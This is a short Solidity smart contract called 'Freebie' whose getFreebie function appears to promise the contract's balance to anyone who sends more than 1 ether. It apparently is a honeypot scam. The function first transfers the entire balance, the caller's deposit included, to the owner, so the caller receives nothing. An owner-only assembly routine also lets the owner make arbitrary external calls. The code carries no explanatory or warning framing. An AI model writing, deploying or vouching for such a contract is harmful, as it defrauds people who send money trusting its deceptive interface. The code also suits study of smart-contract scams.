pragma solidity ^0.4.19;

contract Freebie {
    address public owner = msg.sender;

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        bool success;
        bytes4 sig = bytes4(keccak256("transfer(uint256)"));
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, sig)
            mstore(add(ptr, 0x04), 0x20)
            mstore(add(ptr, 0x24), mload(add(data, 0x20)))
            success := call(sub(gas, 5000), adr, msg.value, ptr, 0x44, ptr, 0x0)
        }
        require(success);
    }
}